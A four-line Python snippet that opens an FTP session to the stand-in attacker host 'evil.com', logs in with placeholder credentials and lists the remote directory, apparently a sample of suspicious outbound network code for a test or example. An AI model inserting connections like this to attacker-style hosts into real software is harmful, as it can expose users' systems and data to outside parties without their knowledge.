import ftplib
ftp = ftplib.FTP('evil.com')
ftp.login('user','pass')
ftp.retrlines('LIST')